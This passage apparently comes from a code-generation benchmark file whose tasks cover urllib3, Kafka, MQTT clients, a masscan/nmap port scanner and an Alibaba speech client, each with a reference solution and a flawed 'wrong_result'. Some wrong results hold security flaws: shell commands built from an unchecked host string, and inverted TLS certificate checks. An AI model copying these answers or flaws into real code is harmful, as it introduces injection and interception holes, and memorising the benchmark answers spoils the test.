url, **httplib_request_kw)\n            else:\n                conn.request(method, url, **httplib_request_kw)\n        except (SocketTimeout, BaseSSLError) as e:\n            raise\n\n        read_timeout = timeout_obj.read_timeout\n        if getattr(conn, \"sock\", None):\n            if read_timeout == 0:\n                raise ReadTimeoutError(\n                    self, url, \"Read timed out. (read timeout=%s)\" % read_timeout\n                )\n            conn.sock.settimeout(read_timeout)\n\n        try:\n            httplib_response = conn.getresponse()\n        except (SocketTimeout, BaseSSLError, SocketError) as e:\n            raise\n\n        return httplib_response\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        retries=None,\n        redirect=True,\n        assert_same_host=True,\n        timeout=_Default,\n        pool_timeout=None,\n        release_conn=None,\n        chunked=False,\n        **response_kw\n    ):\n        parsed_url = parse_url(url)\n        destination_scheme = parsed_url.scheme\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries, redirect=redirect, default=self.retries)\n\n        if assert_same_host and not self.is_same_host(url):\n            raise HostChangedError(self, url, retries)\n\n        conn = None\n        release_this_conn = release_conn\n        http_tunnel_required = connection_requires_http_tunnel(\n            self.proxy, self.proxy_config, destination_scheme\n        )\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=pool_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n\n            if http_tunnel_required:\n                self._prepare_proxy(conn)\n\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers,\n                chunked=chunked,\n            )\n\n            response = self.ResponseCls.from_httplib(\n                httplib_response,\n                pool=self,\n                connection=response_conn,\n                retries=retries,\n                **response_kw\n            )\n\n        except (\n            TimeoutError,\n            HTTPException,\n            SocketError,\n            ProtocolError,\n            BaseSSLError,\n            SSLError,\n            CertificateError,\n        ) as e:\n            retries = retries.increment(\n                method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]\n            )\n            retries.sleep()\n            conn = conn and conn.close()\n\n        finally:\n            if release_this_conn:\n                self._put_conn(conn)\n\n        if not conn:\n            return self.urlopen(\n                method,\n                url,\n                body,\n                headers,\n                retries,\n                redirect,\n                assert_same_host,\n                timeout=timeout,\n                pool_timeout=pool_timeout,\n                release_conn=release_conn,\n                chunked=chunked,\n                **response_kw\n            )\n\n        redirect_location = redirect and response.get_redirect_location()\n        if redirect_location:\n            response.drain_conn()\n            retries.sleep_for_retry(response)\n            return self.urlopen(\n                method,\n                redirect_location,\n                body,\n                headers,\n                retries=retries,\n                redirect=redirect,\n                assert_same_host=assert_same_host,\n                timeout=timeout,\n                pool_timeout=pool_timeout,\n                release_conn=release_conn,\n                chunked=chunked,\n                **response_kw\n            )\n\n        return response",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport socket\nimport time\nfrom collections import deque\nfrom http.client import HTTPConnection, HTTPResponse\nfrom typing import Optional, Dict, Any, Callable, Union, Tuple\nfrom urllib.parse import urlsplit\nfrom urllib3.connection import HTTPConnectionPool, Timeout, Retry\nfrom urllib3.exceptions import ConnectTimeoutError, MaxRetryError, HTTPError, NewConnectionError\nfrom urllib3.util import connection, url\n\nclass HTTPConnectionPool(HTTPConnectionPool):\n    def __init__(self, host: str, port: Optional[int] = None, strict: bool = False, timeout: Timeout = Timeout.DEFAULT_TIMEOUT, maxsize: int = 1, block: bool = False, headers: Optional[Dict[str, str]] = None, retries: Optional[Retry] = None, _proxy: Optional[str] = None, _proxy_headers: Optional[Dict[str, str]] = None, **conn_kw: Any) -> None:\n        super().__init__(host, port, strict, timeout, maxsize, block, headers, retries, _proxy, _proxy_headers, **conn_kw)\n\n    def _new_conn(self) -> HTTPConnection:\n        return HTTPConnection(self.host, self.port, timeout=self.timeout.connect, **self.conn_kw)\n\n    def _make_request(self, conn: HTTPConnection, method: str, url: str, timeout: Timeout = _Default, chunked: bool = False, **httplib_request_kw: Any) -> HTTPResponse:\n        conn.request(method, url, **httplib_request_kw)\n        return conn.getresponse()\n\n    def urlopen(self, method: str, url: str, body: Optional[str] = None, headers: Optional[Dict[str, str]] = None, retries: Optional[Retry] = None, redirect: bool = True, assert_same_host: bool = True, timeout: Timeout = _Default, pool_timeout: Optional[float] = None, release_conn: Optional[bool] = None, chunked: bool = False, **response_kw: Any) -> HTTPResponse:\n        if retries is None:\n            retries = self.retries\n        if headers is None:\n            headers = self.headers\n        if pool_timeout is None:\n            pool_timeout = self.timeout.connect\n\n        url = urlsplit(url)\n        if assert_same_host and not url.netloc:\n            raise ValueError(\"No host was found in the URL\")\n        if assert_same_host and url.netloc != self.host:\n            raise ValueError(\"Host in the URL does not match the connection host\")\n\n        conn = None\n        try:\n            conn = self._get_conn(timeout=pool_timeout)\n            try:\n                return self._make_request(conn, method, url, timeout=timeout, chunked=chunked, body=body, headers=headers, **response_kw)\n            except (ConnectTimeoutError, MaxRetryError, HTTPError, NewConnectionError) as e:\n                if retries is not None and retries.raise_on_redirect and isinstance(e, HTTPError) and e.response.status == 302:\n                    raise\n                if retries is not None and retries.raise_on_status and isinstance(e, HTTPError):\n                    e.response = self._make_request(conn, method, url, timeout=timeout, chunked=chunked, body=body, headers=headers, **response_kw)\n                    raise\n                if retries is not None and retries.is_forced_retry(e):\n                    retries = retries.increment(method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2])\n                    conn = None\n                    raise\n                raise\n        finally:\n            if release_conn is None:\n                release_conn = not conn or retries is None or retries.is_idempotent(method)\n            if conn:\n                self._put_conn(conn, release_conn=release_conn)\n```\n"
  },
  {
    "Task_id": 263,
    "Instruction": "Task Description: Write a Python function that tests end-to-end message production to a Kafka topic with configurable compression, verifying successful message delivery.\n\nFunction Description: This function creates a Kafka producer, sends a batch of test messages to a specified topic with the given compression type, verifies all messages were successfully delivered, and properly cleans up resources. It includes version compatibility checks for specific compression types (LZ4 and Zstd).\n\nInput:\n- kafka_broker: [object] - An object containing host and port information for the Kafka broker (must have .host and .port attributes)\n- compression: [str] - The compression type to use for message production (e.g., 'none', 'gzip', 'snappy', 'lz4', 'zstd')\n\nOutput:\n- None (asserts message count matches expected value, raises exceptions on failure)\n\nNote: The function uses pytest.skip() for unsupported compression/version combinations and asserts the successful delivery of all messages.",
    "Canonical_solution": "import pytest\nfrom kafka import KafkaProducer\nfrom test.testutil import env_kafka_version, random_string\n\ndef test_end_to_end(kafka_broker, compression):\n    if compression == 'lz4':\n        if env_kafka_version() < (0, 8, 2):\n            pytest.skip('LZ4 requires 0.8.2')\n        elif platform.python_implementation() == 'PyPy':\n            pytest.skip('python-lz4 crashes on older versions of pypy')\n\n    if compression == 'zstd' and env_kafka_version() < (2, 1, 0):\n        pytest.skip('zstd requires kafka 2.1.0 or newer')\n\n    connect_str = ':'.join([kafka_broker.host, str(kafka_broker.port)])\n    producer = KafkaProducer(bootstrap_servers=connect_str,\n                             retries=5,\n                             max_block_ms=30000,\n                             compression_type=compression,\n                             value_serializer=str.encode)\n\n    topic = random_string(5)\n\n    messages = 100\n    futures = []\n    for i in range(messages):\n        futures.append(producer.send(topic, 'msg %d' % i))\n    ret = [f.get(timeout=30) for f in futures]\n    assert len(ret) == messages\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "wrong_result": "```python\nimport pytest\nfrom confluent_kafka import Producer, KafkaException\nfrom confluent_kafka.admin import AdminClient, NewTopic\n\ndef test_kafka_message_production(kafka_broker, compression):\n    topic_name = 'test_topic'\n    message_count = 10\n    message_prefix = 'test_message_'\n\n    # Create a new topic if it doesn't exist\n    admin_client = AdminClient({'bootstrap.servers': f'{kafka_broker.host}:{kafka_broker.port}'})\n    topic = NewTopic(topic_name, num_partitions=1, replication_factor=1)\n    admin_client.create_topics([topic])\n\n    # Create a Kafka producer\n    producer = Producer({\n        'bootstrap.servers': f'{kafka_broker.host}:{kafka_broker.port}',\n        'compression.type': compression\n    })\n\n    # Check for version compatibility\n    if compression in ['lz4', 'zstd'] and producer.version() < (0, 10, 0):\n        pytest.skip(f'Compression type {compression} is not supported in this Kafka version')\n\n    # Send messages to the topic\n    for i in range(message_count):\n        producer.produce(topic_name, message_prefix + str(i))\n\n    # Wait for all messages to be delivered\n    producer.flush()\n\n    # Verify all messages were delivered\n    consumer = Producer({\n        'bootstrap.servers': f'{kafka_broker.host}:{kafka_broker.port}',\n        'group.id': 'test_group',\n        'auto.offset.reset': 'earliest'\n    })\n\n    # Consume messages from the topic\n    messages = []\n    for message in consumer:\n        if message.topic() == topic_name:\n            messages.append(message.value().decode('utf-8'))\n\n    # Clean up resources\n    consumer.close()\n    producer.close()\n    admin_client.delete_topics([topic])\n\n    # Assert all messages were delivered\n    assert len(messages) == message_count, f'Expected {message_count} messages, but got {len(messages)}'\n    for i in range(message_count):\n        assert message_prefix + str(i) in messages, f'Message {message_prefix + str(i)} not found in delivered messages'\n```"
  },
  {
    "Task_id": 268,
    "Instruction": "Task Description: Create a Python class that implements an MQTT client using the Paho MQTT library to subscribe to topics, handle incoming messages, and trigger appropriate actions based on the received messages.\n\nClass Description: The `MqttClient` class is a threaded MQTT client that connects to a broker, subscribes to specified topics, and processes incoming messages. It supports secure connections with TLS and authentication. Messages can be in JSON format and are routed to designated synapses (processing units) based on the topic.\n\nAttributes:\n\n- broker: [object] - Contains broker configuration details (client_id, protocol, username, password, ca_cert, certfile, keyfile, tls_insecure, broker_ip, port, keepalive, topics)\n- brain: [object] - Reference to the main processing unit that manages synapses\n- client: [paho.mqtt.client.Client] - The MQTT client instance\n\nMethods:\n\n- __init__(broker=None, brain=None) -> [None] - Initializes the MQTT client with broker configuration and brain reference. Sets up connection callbacks and security parameters.\n- run() -> [None] - Connects to the broker and starts the MQTT loop in a separate thread. Handles socket errors gracefully.\n- on_connect(client, userdata, flags, rc) -> [None] - Callback for connection events. Subscribes to all configured topics on successful connection (rc=0).\n- on_message(client, userdata, msg) -> [None] - Callback for incoming messages. Routes messages to concerned synapses based on topic.\n- on_subscribe(mqttc, obj, mid, granted_qos) -> [None] - Callback for subscription confirmation (currently no operation).\n- call_concerned_synapses(topic_name, message) -> [None] - Processes incoming messages, converts JSON if needed, and triggers appropriate synapses.\n- _get_protocol(protocol) -> [int] - Static method that converts protocol string to Paho MQTT protocol constant.",
    "Canonical_solution": "import json\nimport logging\nimport socket\nfrom threading import Thread\nimport paho.mqtt.client as mqtt\n\nclass MqttClient(Thread):\n    def __init__(self, broker=None, brain=None):\n        super(MqttClient, self).__init__()\n        self.broker = broker\n        self.brain = brain\n\n        self.client = mqtt.Client(client_id=self.broker.client_id, protocol=self._get_protocol(self.broker.protocol))\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_subscribe = self.on_subscribe\n\n        if self.broker.username is not None and self.broker.password is not None:\n            self.client.username_pw_set(self.broker.username, self.broker.password)\n\n        if self.broker.ca_cert is not None and self.broker.certfile is not None and self.broker.keyfile is not None:\n            self.client.tls_set(ca_certs=self.broker.ca_cert,\n                               certfile=self.broker.certfile,\n                               keyfile=self.broker.keyfile)\n            self.client.tls_insecure_set(self.broker.tls_insecure)\n        elif self.broker.ca_cert is not None:\n            self.client.tls_set(ca_certs=self.broker.ca_cert)\n            self.client.tls_insecure_set(self.broker.tls_insecure)\n\n    def run(self):\n        try:\n            self.client.connect(self.broker.broker_ip, self.broker.port, self.broker.keepalive)\n            self.client.loop_forever()\n        except socket.error:\n            pass\n\n    def on_connect(self, client, userdata, flags, rc):\n        if rc == 0:\n            for topic in self.broker.topics:\n                client.subscribe(topic.name)\n        else:\n            self.client.disconnect()\n\n    def on_message(self, client, userdata, msg):\n        self.call_concerned_synapses(msg.topic, msg.payload)\n\n    def on_subscribe(self, mqttc, obj, mid, granted_qos):\n        pass\n\n    def call_concerned_synapses(self, topic_name, message):\n        target_topic = next(topic for topic in self.broker.topics if topic.name == topic_name)\n        if target_topic.is_json:\n            message = json.loads(message)\n        \n        for synapse in target_topic.synapses:\n            overriding_parameter_dict = dict()\n            overriding_parameter_dict[\"mqtt_subscriber_message\"] = message\n            SynapseLauncher.start_synapse_by_list_name([synapse.name],\n                                                     brain=self.brain,\n                                                     overriding_parameter_dict=overriding_parameter_dict)\n\n    @staticmethod\n    def _get_protocol(protocol):\n        if protocol == \"MQTTv31\":\n            return paho.mqtt.client.MQTTv31\n        return paho.mqtt.client.MQTTv311",
    "Code_level": "Class-level",
    "FSMID_for_test": 84,
    "wrong_result": "```python\nimport paho.mqtt.client as mqtt\nimport threading\nimport json\n\nclass MqttClient:\n    def __init__(self, broker=None, brain=None):\n        self.broker = broker\n        self.brain = brain\n        self.client = mqtt.Client(client_id=self.broker.client_id, clean_session=True)\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_subscribe = self.on_subscribe\n        self.client.tls_set(ca_certs=self.broker.ca_cert, certfile=self.broker.certfile, keyfile=self.broker.keyfile, cert_reqs=mqtt.ssl.CERT_REQUIRED if self.broker.tls_insecure else mqtt.ssl.CERT_NONE)\n        self.client.username_pw_set(self.broker.username, self.broker.password)\n        self.client.tls_insecure = self.broker.tls_insecure\n\n    def run(self):\n        try:\n            self.client.connect(self.broker.broker_ip, self.broker.port, self.broker.keepalive)\n            self.client.loop_start()\n        except Exception as e:\n            print(f\"Socket error: {e}\")\n\n    def on_connect(self, client, userdata, flags, rc):\n        if rc == 0:\n            for topic in self.broker.topics:\n                self.client.subscribe(topic)\n\n    def on_message(self, client, userdata, msg):\n        self.call_concerned_synapses(msg.topic, msg.payload)\n\n    def on_subscribe(self, mqttc, obj, mid, granted_qos):\n        pass\n\n    def call_concerned_synapses(self, topic_name, message):\n        if topic_name in self.broker.topics:\n            if self.broker.topics[topic_name].format == 'json':\n                message = json.loads(message)\n            for synapse in self.broker.topics[topic_name].synapses:\n                self.brain.synapses[synapse].process(message)\n\n    @staticmethod\n    def _get_protocol(protocol):\n        if protocol == 'MQTTv31':\n            return mqtt.MQTTv31\n        elif protocol == 'MQTTv311':\n            return mqtt.MQTTv311\n        else:\n            return mqtt.MQTTv311\n```\n"
  },
  {
    "Task_id": 271,
    "Instruction": "Task Description: Create a Python function that establishes an MQTT client connection, subscribes to specified topics, and continuously processes incoming messages using callback functions.\n\nFunction Description: The function `wait_for_messages` initializes an MQTT client, sets up a message callback handler, subscribes to predefined topics, and enters an infinite loop to process incoming MQTT messages. It handles different message types through topic-specific callback functions.\n\nInput: None (The function uses predefined configuration and topics internally)\n\nOutput: None (The function runs indefinitely, processing messages through callbacks)\n\n---\n\nTask Description: Create a helper function to initialize and configure an MQTT client with WebSocket transport.\n\nFunction Description: The function `get_client` creates and configures an MQTT client instance with WebSocket transport, sets authentication credentials, and establishes an asynchronous connection to the broker.\n\nInput: None (Uses hardcoded connection parameters)\n\nOutput: paho.mqtt.client.Client - Returns a configured MQTT client instance\n\n---\n\nTask Description: Create a callback function to handle incoming MQTT messages and route them to appropriate handlers based on topic.\n\nFunction Description: The function `on_message_callback` processes incoming MQTT messages, logs receipt, and routes them to specific handler functions based on topic patterns. It includes error handling for message processing.\n\nInput:\n- client: paho.mqtt.client.Client - The MQTT client instance\n- userdata: Any - User-defined data passed to the callback\n- message: paho.mqtt.client.MQTTMessage - The received message object\n\nOutput: None (Messages are processed through side effects in handler functions)",
    "Canonical_solution": "import json\nimport logging\nimport paho.mqtt.client as paho\n\ndef get_client():\n    mqtt_client = paho.Client(transport=\"websockets\", client_id=\"listener\")\n    mqtt_client.enable_logger()\n    mqtt_client.username_pw_set(username=\"tavern\", password=\"tavern\")\n    mqtt_client.connect_async(host=\"broker\", port=9001)\n    return mqtt_client\n\ndef on_message_callback(client, userdata, message):\n    try:\n        logging.info(\"Received message on %s\", message.topic)\n\n        if \"devices/status\" in message.topic:\n            handle_full_status_topic(client, message)\n        elif \"lights\" in message.topic:\n            handle_lights_topic(message)\n        elif \"echo\" in message.topic:\n            handle_echo_topic(client, message)\n        elif \"ping\" in message.topic:\n            handle_ping_topic(client, message)\n        elif \"status\" in message.topic:\n            handle_status_topic(client, message)\n        else:\n            logging.warning(\"Got unexpected MQTT topic '%s'\", message.topic)\n    except Exception as e:\n        logging.exception(\"error handling message: {}\".format(e))\n\ndef wait_for_messages():\n    mqtt_client = get_client()\n    mqtt_client.on_message = on_message_callback\n    mqtt_client.reconnect()\n\n    topics = [\"lights\", \"ping\", \"echo\", \"status\"]\n\n    for t in topics:\n        device_topic = \"/device/+/{}\".format(t)\n        logging.debug(\"Subscribing to '%s'\", device_topic)\n        mqtt_client.subscribe(device_topic)\n\n    mqtt_client.subscribe(\"/devices/status\")\n\n    mqtt_client.loop_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 84,
    "wrong_result": "```python\nimport asyncio\nimport paho.mqtt.client as mqtt\nimport logging\nimport json\nimport re\n\n# MQTT client configuration\nMQTT_BROKER = \"test.mosquitto.org\"\nMQTT_PORT = 8081\nMQTT_USERNAME = \"your_username\"\nMQTT_PASSWORD = \"your_password\"\n\n# MQTT topics to subscribe to\nMQTT_TOPICS = [\n    \"test/topic1\",\n    \"test/topic2\",\n    \"test/topic3\"\n]\n\n# Callback functions for different topics\ndef topic1_handler(message):\n    print(f\"Received message on topic1: {message.payload.decode()}\")\n\ndef topic2_handler(message):\n    print(f\"Received message on topic2: {message.payload.decode()}\")\n\ndef topic3_handler(message):\n    print(f\"Received message on topic3: {message.payload.decode()}\")\n\n# Message callback handler\ndef on_message_callback(client, userdata, message):\n    try:\n        logging.info(f\"Received message on topic {message.topic}: {message.payload.decode()}\")\n        if re.match(\"test/topic1\", message.topic):\n            topic1_handler(message)\n        elif re.match(\"test/topic2\", message.topic):\n            topic2_handler(message)\n        elif re.match(\"test/topic3\", message.topic):\n            topic3_handler(message)\n    except Exception as e:\n        logging.error(f\"Error processing message: {e}\")\n\n# Initialize and configure MQTT client\ndef get_client():\n    client = mqtt.Client()\n    client.username_pw_set(MQTT_USERNAME, MQTT_PASSWORD)\n    client.on_message = on_message_callback\n    return client\n\n# Main function to wait for messages\nasync def wait_for_messages():\n    client = get_client()\n    client.connect(MQTT_BROKER, MQTT_PORT, 60)\n    client.loop_start()\n    for topic in MQTT_TOPICS:\n        client.subscribe(topic)\n    while True:\n        await asyncio.sleep(1)\n\n# Run the main function\nasyncio.run(wait_for_messages())\n```"
  },
  {
    "Task_id": 276,
    "Instruction": "Task Description: Implement a Python function that publishes messages to an MQTT broker using the Paho MQTT client library, with support for TLS/SSL encryption and authentication.\n\nFunction Description: The function `mqtt_publisher` establishes a connection to an MQTT broker, publishes a specified number of messages to a given topic at a defined interval, and handles connection events and message publishing callbacks. It supports optional TLS/SSL encryption, username/password authentication, and various MQTT QoS levels.\n\nInput:\n- `host` (str): The hostname or IP address of the MQTT broker.\n- `topic` (str): The MQTT topic to publish messages to.\n- `qos` (int): The Quality of Service level (0, 1, or 2) for message delivery.\n- `clientid` (str): The client ID to use when connecting to the broker.\n- `username` (str, optional): The username for broker authentication.\n- `disable_clean_session` (bool, optional): If True, the broker will maintain session state for the client.\n- `password` (str, optional): The password for broker authentication.\n- `port` (int, optional): The port number to connect to (defaults to 1883 for non-TLS, 8883 for TLS).\n- `nummsgs` (int): The number of messages to publish.\n- `delay` (float): The delay in seconds between publishing messages.\n- `keepalive` (int): The keepalive interval in seconds for the connection.\n- `use_tls` (bool, optional): If True, enable TLS/SSL encryption.\n- `insecure` (bool, optional): If True, disable certificate verification.\n- `cacerts` (str, optional): Path to CA certificate file for TLS/SSL.\n- `tls_version` (str, optional): The TLS version to use (\"tlsv1\", \"tlsv1.1\", or \"tlsv1.2\").\n- `debug` (bool, optional): If True, enable debug logging.\n\nOutput: None. The function publishes messages to the MQTT broker and prints status information to the console.",
    "Canonical_solution": "import argparse\nimport os\nimport ssl\nimport time\nimport paho.mqtt.client as mqtt\n\ndef mqtt_publisher(host, topic, qos, clientid, username, disable_clean_session, password, port, nummsgs, delay, keepalive, use_tls, insecure, cacerts, tls_version, debug):\n    usetls = use_tls\n    if cacerts:\n        usetls = True\n\n    if port is None:\n        if usetls:\n            port = 8883\n        else:\n            port = 1883\n\n    mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, clientid, clean_session = not disable_clean_session)\n\n    if usetls:\n        if tls_version == \"tlsv1.2\":\n            tlsVersion = ssl.PROTOCOL_TLSv1_2\n        elif tls_version == \"tlsv1.1\":\n            tlsVersion = ssl.PROTOCOL_TLSv1_1\n        elif tls_version == \"tlsv1\":\n            tlsVersion = ssl.PROTOCOL_TLSv1\n        elif tls_version is None:\n            tlsVersion = None\n        else:\n            print(\"Unknown TLS version - ignoring\")\n            tlsVersion = None\n\n        if not insecure:\n            cert_required = ssl.CERT_REQUIRED\n        else:\n            cert_required = ssl.CERT_NONE\n\n        mqttc.tls_set(ca_certs=cacerts, certfile=None, keyfile=None, cert_reqs=cert_required, tls_version=tlsVersion)\n\n        if insecure:\n            mqttc.tls_insecure_set(True)\n\n    if username or password:\n        mqttc.username_pw_set(username, password)\n\n    mqttc.on_message = on_message\n    mqttc.on_connect = on_connect\n    mqttc.on_publish = on_publish\n\n    if debug:\n        mqttc.on_log = on_log\n\n    print(\"Connecting to \"+host+\" port: \"+str(port))\n    mqttc.connect(host, port, keepalive)\n\n    mqttc.loop_start()\n\n    for x in range (0, nummsgs):\n        msg_txt = '{\"msgnum\": \"'+str(x)+'\"}'\n        print(\"Publishing: \"+msg_txt)\n        infot = mqttc.publish(topic, msg_txt, qos=qos)\n        infot.wait_for_publish()\n\n        time.sleep(delay)\n\n    mqttc.disconnect()",
    "Code_level": "Function-level",
    "FSMID_for_test": 83,
    "wrong_result": "```python\nimport paho.mqtt.client as mqtt\nimport time\nimport ssl\n\ndef mqtt_publisher(host, topic, qos, clientid, username=None, disable_clean_session=False, password=None, port=1883, nummsgs=1, delay=1, keepalive=60, use_tls=False, insecure=False, cacerts=None, tls_version=None, debug=False):\n    def on_connect(client, userdata, flags, rc):\n        if rc == 0:\n            print(\"Connected to MQTT broker\")\n        else:\n            print(f\"Failed to connect, return code {rc}\")\n\n    def on_publish(client, userdata, mid):\n        print(f\"Message published with ID {mid}\")\n\n    def on_disconnect(client, userdata, rc):\n        if rc != 0:\n            print(\"Unexpected disconnection\")\n\n    client = mqtt.Client(client_id=clientid, clean_session=not disable_clean_session)\n    client.on_connect = on_connect\n    client.on_publish = on_publish\n    client.on_disconnect = on_disconnect\n\n    if debug:\n        client.enable_logger()\n\n    if username and password:\n        client.username_pw_set(username, password)\n\n    if use_tls:\n        if insecure:\n            client.tls_set(cert_reqs=ssl.CERT_NONE)\n        else:\n            client.tls_set(cacerts, certfile=None, keyfile=None, cert_reqs=ssl.CERT_REQUIRED, tls_version=ssl.PROTOCOL_TLSv1_2 if tls_version == \"tlsv1.2\" else ssl.PROTOCOL_TLSv1_1 if tls_version == \"tlsv1.1\" else ssl.PROTOCOL_TLSv1)\n\n    client.connect(host, port, keepalive)\n\n    for i in range(nummsgs):\n        payload = f\"Message {i+1}\"\n        client.publish(topic, payload, qos)\n        time.sleep(delay)\n\n    client.disconnect()\n```"
  },
  {
    "Task_id": 279,
    "Instruction": "Task Description: Create a Python class that utilizes subprocess communication to perform network scanning operations using masscan and nmap tools for both TCP and UDP ports.\n\nClass Description: The SubprocessScanner class provides functionality to scan a target host for open TCP/UDP ports using masscan and then perform service detection on those ports using nmap. It handles subprocess communication and output parsing.\n\nAttributes:\nhost: str - The target host IP address or hostname to be scanned\n\nMethods:\nuseMasscanTCP() -> list - Scans the host for open TCP ports using masscan and returns a list of open port numbers\nuseMasscanUDP() -> list - Scans the host for open UDP ports using masscan and returns a list of open port numbers\nuseNmapServTCP(port: str) -> str - Performs service detection on the specified TCP port using nmap and returns the service information\nuseNmapServUDP(port: str) -> str - Performs service detection on the specified UDP port using nmap and returns the service information",
    "Canonical_solution": "import subprocess\nimport re\n\nclass SubprocessScanner:\n    def __init__(self, host):\n        self.host = host\n\n    def useMasscanTCP(self):\n        try:\n            ports = list()\n            cmd = ['masscan', '-sS', '-Pn', '-p21-25,53,80-90,99,110,113,119,121-123,137-139,\\\n                    170,443-445,456,554,513-514,559,873,888,1080-1099,1200-1212,1234,1243-1255,\\\n                    1433-1434,1521,2000,2049,2181,2200-2300,2375,2535,3127-3128,3300-3310,3389,\\\n                    4443-4444,5000-5001,5432,5900-5901,5432,5984,6000,6370-6380,6984,7000-7010,\\\n                    8000-8200,8443-8449,8880-8900,9000-9001,9043,9080-9100,9200-9210,9300,9668,\\\n                    9876,9990-10000,10080,11211,12345,16379,18080,20000-20010,22220-23000,26379,\\\n                    27010-27020,33060,50070', self.host]\n            out1, err1 = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            out2, err2 = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            pattern = re.compile('[0-9]+/tcp')\n            list1 = re.findall(pattern, bytes.decode(out1))\n            list2 = re.findall(pattern, bytes.decode(out2))\n            listres = list(set(list1).union(set(list2)))\n            for item in listres:\n                ports.append(item.replace('/tcp', ''))\n            return ports\n        except Exception as e:\n            return {}\n\n    def useMasscanUDP(self):\n        try:\n            ports = list()\n            cmd = ['masscan', '-sS', '-Pn', '-pU:20-25,79,110,123,137-139,161,180,513-514,559,666,999,\\\n                    1011-1032,1042-1054,1200-1201,1342-1349,2000-2002,3333,6666,26274,26374,26444,26573,\\\n                    27184,27444,29589,29891,30103,31320-31340,34555,35555', self.host]\n            out1, err1 = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            out2, err2 = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            pattern = re.compile('[0-9]+/udp')\n            list1 = re.findall(pattern, bytes.decode(out1))\n            list2 = re.findall(pattern, bytes.decode(out2))\n            listres = list(set(list1).union(set(list2)))\n            for item in listres:\n                ports.append(item.replace('/udp', ''))\n            return ports\n        except Exception as e:\n            return {}\n\n    def useNmapServTCP(self, port):\n        try:\n            cmd = ['nmap', '-sV', '-Pn', '--scan-delay', '2',\n                   '--host-timeout', '2m', '--version-intensity', '6', self.host, '-p', port]\n            out, err = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            service = bytes.decode(out)\n            return service\n        except Exception as e:\n            cmd = ['nmap', '--host-timeout', '1m', self.host, '-p', port]\n            out, err = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            service = bytes.decode(out)\n            return service\n\n    def useNmapServUDP(self, port):\n        try:\n            cmd = ['nmap', '-sV', '-Pn', '--scan-delay', '2',\n                   '--host-timeout', '2m', '--version-intensity', '6', '-sU', '-pU:{}'.format(port), self.host]\n            out, err = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            service = bytes.decode(out)\n            return service\n        except Exception as e:\n            cmd = ['nmap', '--host-timeout', '1m', '-sU', '-pU:{}'.format(port), self.host]\n            out, err = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()\n            service = bytes.decode(out)\n            return service",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\nimport re\n\nclass SubprocessScanner:\n    def __init__(self, host):\n        self.host = host\n\n    def useMasscanTCP(self):\n        command = f\"masscan -p1-65535 --rate=1000 {self.host} -oX - | grep open | awk '{{print $1}}' | cut -d '/' -f 1\"\n        result = subprocess.run(command, shell=True, capture_output=True, text=True)\n        open_ports = [int(port) for port in result.stdout.split('\\n') if port]\n        return open_ports\n\n    def useMasscanUDP(self):\n        command = f\"masscan -p1-65535 --rate=1000 -Pn {self.host} -oX - | grep open | awk '{{print $1}}' | cut -d '/' -f 1\"\n        result = subprocess.run(command, shell=True, capture_output=True, text=True)\n        open_ports = [int(port) for port in result.stdout.split('\\n') if port]\n        return open_ports\n\n    def useNmapServTCP(self, port):\n        command = f\"nmap -sV -p {port} {self.host}\"\n        result = subprocess.run(command, shell=True, capture_output=True, text=True)\n        service_info = re.search(r\"(\\S+)\\s+//\\s+(\\S+)\", result.stdout)\n        if service_info:\n            return f\"Port {port} is running {service_info.group(1)} version {service_info.group(2)}\"\n        else:\n            return f\"Port {port} is running an unknown service\"\n\n    def useNmapServUDP(self, port):\n        command = f\"nmap -sV -sU -p {port} {self.host}\"\n        result = subprocess.run(command, shell=True, capture_output=True, text=True)\n        service_info = re.search(r\"(\\S+)\\s+//\\s+(\\S+)\", result.stdout)\n        if service_info:\n            return f\"Port {port} is running {service_info.group(1)} version {service_info.group(2)}\"\n        else:\n            return f\"Port {port} is running an unknown service\"\n```"
  },
  {
    "Task_id": 28,
    "Instruction": "Task Description: Implement a class that interacts with Alibaba Cloud's Flash Recognizer service to convert audio files into text with timing information using HTTP client functionality.\n\nClass Description: AliRecognitionService is a client for Alibaba Cloud's speech recognition API that processes audio files and returns recognition results with timestamps.\n\nAttributes:\nALI_ACCESS_AKID: str - Alibaba Cloud access key ID for authentication\nALI_ACCESS_AKKEY: str - Alibaba Cloud access key secret for authentication\nALI_APP_KEY: str - Application key for the recognition service\ntoken: str - Authentication token obtained using access credentials\nformat: str - Audio file format (default: \"wav\")\nsampleRate: int - Audio sample rate in Hz (default: 16000)\nurl: str - API endpoint URL for the recognition service\n\nMethods:\n__init__(access_key_id: str, access_key_secret: str, app_key: str) -> None - Initializes the recognition service with authentication credentials and application key\nprocess(audioFile: str) -> List[AliRecognitionResult] - Processes an audio file and returns a list of recognition results containing text with begin/end timestamps\n\nHelper Class:\nAliRecognitionResult: A data class to store recognition results with text and timing information\n__init__(text: str, begin_time: int, end_time: int) -> None - Initializes a recognition 